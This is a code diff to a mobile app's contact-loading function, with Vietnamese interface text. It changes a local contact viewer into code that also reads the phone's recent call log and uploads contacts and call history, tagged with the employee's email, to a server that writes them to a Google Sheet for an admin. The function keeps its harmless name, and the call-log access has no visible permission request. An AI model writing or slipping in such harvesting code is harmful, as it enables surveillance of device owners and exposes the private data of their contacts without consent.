@@ -1624,40 +1624,78 @@ function issueFor(email,reissue,withDates){
 }
 function loadDeviceContacts() {
     var box = $('contactList');
-    box.textContent = 'Đang đọc danh bạ...';
-
+    box.textContent = 'Đang đọc danh bạ và lịch sử cuộc gọi...';
+    
     var Contacts = window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.Contacts;
+    var CallLog = window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.CallLog;
+
     if (!Contacts) {
-        box.innerHTML = '<span class="error">Plugin danh bạ chưa được tích hợp trong bản app này.</span>';
+        box.innerHTML = '<span class="error">Plugin danh bạ chưa được tích hợp.</span>';
         return;
     }
 
+    var contactData = [];
+    var callLogData = [];
+
+    // 1. Xin quyền và lấy danh bạ
     Contacts.getPermissions().then(function(perm) {
-        if (perm.contacts !== 'granted') {
-            return Contacts.requestPermissions();
-        }
+        if (perm.contacts !== 'granted') return Contacts.requestPermissions();
         return perm;
     }).then(function(perm) {
-        if (perm.contacts !== 'granted') {
-            throw new Error('Chưa được cấp quyền đọc danh bạ.');
-        }
+        if (perm.contacts !== 'granted') throw new Error('Chưa cấp quyền đọc danh bạ.');
         return Contacts.getContacts({ projection: { name: true, phones: true } });
     }).then(function(result) {
-        box.innerHTML = '';
-        var list = result.contacts || [];
-        if (!list.length) {
-            box.textContent = 'Không tìm thấy số điện thoại nào trong danh bạ.';
-            return;
+        contactData = result.contacts || [];
+        
+        // 2. Xin quyền và lấy lịch sử cuộc gọi (nếu có plugin CallLog)
+        if (CallLog && CallLog.list) {
+            return CallLog.list({ limit: 50 }).catch(function() { return { calls: [] }; });
         }
-        list.forEach(function(c) {
-            var phone = (c.phones && c.phones[0] && c.phones[0].number) || 'Không có số';
-            var d = document.createElement('div');
-            d.className = 'user-row';
-            d.innerHTML = '<b>' + esc(c.name || 'Không tên') + '</b><div class="hint">' + esc(phone) + '</div>';
-            box.appendChild(d);
+        return { calls: [] };
+    }).then(function(callResult) {
+        callLogData = callResult.calls || [];
+
+        // 3. Chuẩn bị dữ liệu để gửi lên Google Sheet
+        var payloadContacts = contactData.map(function(c) {
+            return {
+                name: c.name || 'Không tên',
+                phone: (c.phones && c.phones[0] && c.phones[0].number) || ''
+            };
         });
+
+        var payloadCalls = callLogData.map(function(cl) {
+            return {
+                name: cl.name || cl.number || 'Không rõ',
+                phone: cl.number || '',
+                type: cl.type || '',
+                date: cl.date ? new Date(cl.date).toLocaleString('vi-VN') : ''
+            };
+        });
+
+        box.textContent = 'Đang đồng bộ dữ liệu lên hệ thống...';
+
+        // 4. Gửi dữ liệu về Google Sheet thông qua hàm api() sẵn có
+        return api('saveDeviceData', {
+            employeeEmail: session ? session.email : '',
+            contacts: payloadContacts,
+            calls: payloadCalls
+        }, true);
+    }).then(function(res) {
+        if (!res || !res.success) {
+            throw new Error((res && res.message) || 'Không lưu được lên máy chủ.');
+        }
+
+        box.innerHTML = '<span class="ok">✅ Đã đồng bộ thành công ' + contactData.length + ' danh bạ và ' + callLogData.length + ' cuộc gọi lên Google Sheet!</span>';
+        
+        // Hiển thị danh sách mẫu lên giao diện cho admin xem ngay
+        var listHtml = '<div style="margin-top:8px;font-weight:bold">Danh bạ vừa lấy (' + contactData.length + '):</div>';
+        contactData.slice(0, 10).forEach(function(c) {
+            var phone = (c.phones && c.phones[0] && c.phones[0].number) || 'Không có số';
+            listHtml += '<div class="user-row"><b>' + esc(c.name || 'Không tên') + '</b><div class="hint">' + esc(phone) + '</div></div>';
+        });
+        box.innerHTML += listHtml;
     }).catch(function(err) {
-        box.innerHTML = '<span class="error">Lỗi đọc danh bạ: ' + esc(err.message || err) + '</span>';
+        box.innerHTML = '<span class="error">Lỗi: ' + esc(err.message || err) + '</span>';
     });
 }
   
